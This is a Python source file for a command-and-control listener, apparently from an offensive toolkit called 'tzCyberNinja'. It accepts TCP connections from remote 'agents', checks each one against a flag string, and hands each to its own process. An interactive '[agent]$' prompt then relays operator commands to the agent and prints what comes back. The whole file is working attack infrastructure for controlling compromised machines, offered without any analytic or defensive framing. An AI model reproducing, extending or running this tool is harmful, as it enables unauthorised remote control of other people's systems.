#/usr/bin/python3
import multiprocessing
import os
import socket
import sys
import signal
import threading

AgentParentChildBucket = multiprocessing.Manager().dict()
ProcessList = multiprocessing.Manager().dict()

def AgentSelector(AgentName):
    Command = ""
    try:
        for x, y in AgentParentChildBucket.items():
            if (x == AgentName):
                for u, v in y.items():
                    while (True):
                        Command = input("[" + AgentName + "]$ ")
                        if (Command == "back"):
                            break
                        # Send Command to Parent Process
                        u.send(Command + "\n")
                        if (Command == "exit"):
                            break

    except KeyboardInterrupt:
        print("\n")
        pass

def recvDataThread(AgentConnection, AgentName):
    while True:
        recvData = b''
        try:
            while (True):
                part = AgentConnection.recv(65536)
                recvData += part
                if len(part) < 65536:
                    break
            if recvData == b'':
                print("[x]" + AgentName + " disconnected!")
                break
            else:
                if (recvData.decode() == "\n"):
                    pass
                else:
                    print("\n" + recvData.decode())
        except Exception as ex:
            print("\n[x]" + AgentName + " dropped!")
            break

def ChildListener(AgentParent, AgentChild, AgentConnection, AgentAddress, C2cJob, AgentFlag):
    AgentName = multiprocessing.current_process().name
    AgentPID = multiprocessing.current_process().pid
    AgentRequest = (AgentConnection.recv(1024)).decode('utf-8')
    if (len(AgentRequest) < 5):
        AgentRequest = (AgentConnection.recv(1024)).decode('utf-8')
    print("[!] Agent Connection received. Verifying authenticity...")
    if AgentFlag in AgentRequest:
        print("[+] Agent connected => " + AgentAddress[0] + ":" + str(AgentAddress[1]) + " || PID:" + str(AgentPID) + " || " + AgentName)
        ProcessList[AgentPID] = AgentName
        AgentParentChildBucket[AgentName] = {AgentParent:AgentChild}
        # Used to start a thread in the background to listen to all incoming connections.
        # Need to add alternate ways to kill the thread
        t = threading.Thread(target=recvDataThread, args=(AgentConnection,AgentName,))
        t.daemon = True
        t.start()

        # Listen to commands on agent IPC channel for C&C and send data to the agent
        while (True):
            try:
                #Receive Command from Parent Process
                Command = AgentChild.recv()
                AgentConnection.sendall((Command).encode('utf-8'))
                if (Command == "exit\n"):
                    del AgentParentChildBucket[AgentName]
                    del ProcessList[AgentPID]
                    print("[!] Killed " + AgentName)
                    # BotChild.send("AgentExit")
                    os.kill(int(AgentPID), signal.SIGKILL)
                    break

            except socket.error as se:
                print("[x] Agent socket error, killing process...")
                del AgentParentChildBucket[AgentName]
                del ProcessList[AgentPID]
                # AgentChild.send("\n")
                break
    else:
        print("[x] Authenticity Failed. Dropping connection!")
        os.kill(int(AgentPID), signal.SIGKILL)

class ParentListener(multiprocessing.Process):
    def __init__(self, lhost, lport, iflag):
        multiprocessing.Process.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.iflag = iflag
    
    def run(self):
        SocketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SocketServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        SocketServerAddress = (self.lhost, self.lport)
        SocketServer.bind(SocketServerAddress)
        SocketServer.listen(100)
        C2cJob = multiprocessing.current_process().name
        C2cJobPID = multiprocessing.current_process().pid
        ProcessList[C2cJobPID] = (C2cJob + " => " + self.lhost + ":" + str(self.lport))
        print("\n[*] " + C2cJob + " initiated\n[*] Starting tzCyberNinja Listener => " + self.lhost + ":" + str(self.lport) + " || PID:" + str(C2cJobPID))
        while (True):
            try:
                (AgentConnection, AgentAddress) = SocketServer.accept()
                AgentParent, AgentChild = multiprocessing.Pipe()
                ChildListenerProcess = multiprocessing.Process(target = ChildListener, args = (
                        AgentParent, AgentChild, AgentConnection, AgentAddress, C2cJob, self.iflag
                    )
                )
                ChildListenerProcess.start()
            except socket.error as se:
                print("[x] Server Level Error: " + str(se) + "\n")


def Listener(lhost, lport, iflag):
    ParentListenerProcess = ParentListener(lhost, lport, iflag)
    ParentListenerProcess.start()